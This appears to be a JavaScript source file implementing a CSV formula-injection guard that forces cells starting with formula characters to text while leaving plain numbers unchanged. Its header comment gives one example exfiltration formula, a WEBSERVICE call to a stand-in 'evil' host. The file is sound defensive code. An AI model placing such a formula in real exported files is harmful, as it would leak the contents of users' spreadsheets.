/**
 * CSV formula-injection guard - CWE-1236 / OWASP "CSV Injection".
 *
 * Spreadsheet apps (Excel, LibreOffice, Google Sheets) evaluate a cell as a
 * FORMULA when its first character is  =  +  -  @  or a leading TAB / CR / LF.
 * A dimension label such as  =WEBSERVICE("http://evil/?x="&A1)  exfiltrates the
 * opened sheet on first render. RFC-4180 quote-doubling does NOT stop this:
 * Excel strips the CSV quotes on import and still sees the leading "=".
 *
 * Fix: prefix a single quote (') so the cell is forced to text. Plain numbers
 * - including negatives and en/ru decimal styles (-5, -3,50, -1 234,5, .5, ,5)
 * - are exempted, so numeric columns keep their type and SUM/AVG keep working
 * in the opened sheet. This is a true no-op on numerics, not a visual one.
 *
 * CANONICAL SOURCE. Copied byte-identical into each plugin (see root CLAUDE.md
 * "CSV formula-injection guard" sync block). Do NOT edit the copies directly.
 */
// Leading char that makes a spreadsheet treat the cell as a formula.
const FORMULA_TRIGGER = /^[=+\-@\t\r\n]/;
// A plain number we must NOT mangle: optional +/- sign, en "." or ru ","
// decimal separator, and any whitespace as a thousands separator. \s matches
// ASCII space plus NBSP (U+00A0) and narrow NBSP (U+202F) used by ru locales.
// Allows integer, integer+fraction, and fraction-only (".5" / ",5").
const PLAIN_NUMBER = /^[+-]?(?:\d[\d\s]*(?:[.,]\d+)?|[.,]\d+)$/;
export function sanitizeCsvCell(value) {
    const s = value == null ? '' : String(value);
    if (s === '' || !FORMULA_TRIGGER.test(s))
        return s;
    if (PLAIN_NUMBER.test(s))
        return s; // negative/decimal numbers stay numeric
    return `'${s}`;
}
//# sourceMappingURL=sanitizeCsvCell.js.map